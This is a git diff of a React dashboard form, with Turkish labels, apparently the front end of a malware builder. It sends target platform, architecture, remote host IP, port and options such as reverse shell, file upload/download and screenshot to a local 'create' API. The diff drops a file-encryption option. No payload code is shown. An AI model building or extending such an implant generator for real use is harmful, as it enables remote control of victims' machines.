@@ -1,10 +1,10 @@
-import React, {useEffect} from 'react';
+import React, {useEffect, useState} from 'react';
 import DashboardLayout from "../DashboardLayout";
 import {
     Card, CardContent,
     createStyles,
     FormControl, FormHelperText,
-    InputLabel, Select, Tooltip
+    InputLabel, Select, Snackbar, Tooltip
 } from "@material-ui/core";
 import {makeStyles} from "@material-ui/core/styles";
 import Typography from "@material-ui/core/Typography";
@@ -16,8 +16,8 @@ import FormControlLabel from "@material-ui/core/FormControlLabel";
 import Checkbox from "@material-ui/core/Checkbox";
 import Button from "@material-ui/core/Button";
 import {usePage} from "../PageContext";
-import {useHistory} from "react-router-dom";
 import {useAuth} from "../../Account/AuthenticationContext";
+import {Alert} from "@material-ui/lab";
 
 const useStyles = makeStyles((theme) =>
     createStyles({
@@ -57,27 +57,27 @@ Yup.addMethod(Yup.string, 'ipv4', ipv4);
 const validationSchemaClient = Yup.object().shape({
     kind: Yup.string().required("Oluşturma türü boş bırakılamaz."),
     platform: Yup.string().required("Platform boş bırakılamaz."),
+    arch: Yup.string().required("Mimari bilgisi boş bırakılamaz."),
     remote_host: Yup.string().ipv4().required("Uzak bağlantı adresi boş bırakılamaz."),
     remote_port: Yup.number().typeError("Port bilgisi geçersiz.").required("Uzak bağlantı portu boş bırakılamaz."),
 });
 
-const MalwareForm = ({type}) => {
-    const history = useHistory();
-
+const MalwareForm = () => {
     const classes = useStyles();
     const initialStateClient = {
         kind: "",
         platform: "",
+        arch: "",
         remote_host: "",
         remote_port: "",
         reverse_shell: true,
         download: false,
         upload: false,
         screenshot: false,
-        file_crypto: false,
     };
 
     const [token, _] = useAuth();
+    const [snackbar, setSnackbar] = useState({open: false, success: false, message: ""});
 
     return (
         <Formik initialValues={initialStateClient} validationSchema={validationSchemaClient} onSubmit={(values, {validateForm, resetForm, setSubmitting}) => {
@@ -87,7 +87,7 @@ const MalwareForm = ({type}) => {
                     if (typeof(values[key]) === "boolean" && values[key])
                         functions.push(key);
 
-                fetch(`http://localhost:8080/api/create`, {
+                fetch(`http://localhost:8001/api/create`, {
                     method: "POST",
                     headers: {
                         'Accept': 'application/json',
@@ -97,17 +97,16 @@ const MalwareForm = ({type}) => {
                     body: JSON.stringify({
                         kind: values.kind,
                         platform: values.platform,
+                        arch: values.arch,
                         remote_host: values.remote_host,
                         remote_port: values.remote_port,
                         functions
                     })
                 }).then((resp) => resp.json()).then((data) => {
-                    if (data.success) {
-                        history.push("/dashboard/create");
-                    }
+                    resetForm();
+                    setSubmitting(false);
+                    setSnackbar({open: true, success: data.success, message: data.message});
                 }).catch((err) => console.error(err));
-                resetForm();
-                setSubmitting(false);
             });
         }}>
             {({errors,
@@ -118,12 +117,17 @@ const MalwareForm = ({type}) => {
                   handleBlur,
                   setSubmitting}) => (
                 <Form onSubmit={handleSubmit} className={classes.form}>
+                    <Snackbar anchorOrigin={{vertical: "top", horizontal: "right"}} open={snackbar.open} autoHideDuration={2250} onClose={() => setSnackbar({open: false, success: false, message: ""})}>
+                        <Alert onClose={() => setSnackbar({open: false, success: false, message: ""})} severity={snackbar.success ? "success" : "error"}>
+                            {snackbar.message}
+                        </Alert>
+                    </Snackbar>
                     <Grid item xs={12} sm={12} style={{marginBottom: "1.2rem"}}>
                         <Grid style={{marginBottom: ".4rem"}} item xs={12}>
                             <Typography color={"#2c3040"} variant={"subtitle1"} component={"h6"}>Genel Özellikler</Typography>
                         </Grid>
                         <FormControl error={Boolean(touched.kind && errors.kind)} style={{marginBottom: "1rem"}} fullWidth variant="outlined" className={classes.formControl}>
-                            <InputLabel htmlFor="outlined-age-native-simple">Oluşturma Türü</InputLabel>
+                            <InputLabel htmlFor="kind">Oluşturma Türü</InputLabel>
                             <Select
                                 native
                                 value={values.kind}
@@ -132,7 +136,7 @@ const MalwareForm = ({type}) => {
                                 onBlur={handleBlur}
                                 inputProps={{
                                     name: 'kind',
-                                    id: 'outlined-age-native-simple',
+                                    id: "kind"
                                 }}
                             >
                                 <option aria-label="None" value="" />
@@ -142,8 +146,8 @@ const MalwareForm = ({type}) => {
                             </Select>
                             <FormHelperText>{touched.kind && errors.kind}</FormHelperText>
                         </FormControl>
-                        <FormControl error={Boolean(touched.platform && errors.platform)} fullWidth variant="outlined" className={classes.formControl}>
-                            <InputLabel htmlFor="outlined-age-native-simple">Platform</InputLabel>
+                        <FormControl error={Boolean(touched.platform && errors.platform)} style={{marginBottom: "1rem"}} fullWidth variant="outlined" className={classes.formControl}>
+                            <InputLabel htmlFor="platform">Platform</InputLabel>
                             <Select
                                 native
                                 value={values.platform}
@@ -152,15 +156,34 @@ const MalwareForm = ({type}) => {
                                 label="Platform"
                                 inputProps={{
                                     name: 'platform',
-                                    id: 'outlined-age-native-simple-2',
+                                    id: "platform"
                                 }}
                             >
                                 <option aria-label="None" value="" />
                                 <option value={"windows"}>Windows</option>
                                 <option value={"linux"}>Linux</option>
-                                <option value={"osx"}>Mac OS</option>
+                                <option value={"darwin"}>Mac OS</option>
                             </Select>
                             <FormHelperText>{touched.platform && errors.platform}</FormHelperText>
+                        </FormControl>
+                        <FormControl error={Boolean(touched.arch && errors.arch)} fullWidth variant="outlined" className={classes.formControl}>
+                            <InputLabel htmlFor="arch">Mimari</InputLabel>
+                            <Select
+                                native
+                                value={values.arch}
+                                onChange={handleChange}
+                                onBlur={handleBlur}
+                                label="Mimari"
+                                inputProps={{
+                                    name: "arch",
+                                    id: "arch"
+                                }}
+                            >
+                                <option aria-label="None" value="" />
+                                <option value={"386"}>32-bit</option>
+                                <option value={"amd64"}>64-bit</option>
+                            </Select>
+                            <FormHelperText>{touched.arch && errors.arch}</FormHelperText>
                         </FormControl>
                     </Grid>
                     <Grid item xs={12} sm={12} style={{marginBottom: "1.2rem"}}>
@@ -255,17 +278,6 @@ const MalwareForm = ({type}) => {
                                     />
                                 }
                                 label="Screenshot"
-                            />
-                            <FormControlLabel
-                                control={
-                                    <Checkbox
-                                        checked={values.file_crypto}
-                                        onChange={handleChange}
-                                        name="file_crypto"
-                                        color="primary"
-                                    />
-                                }
-                                label="File encryption/decryption"
                             />
                         </Grid>
                     </Grid>
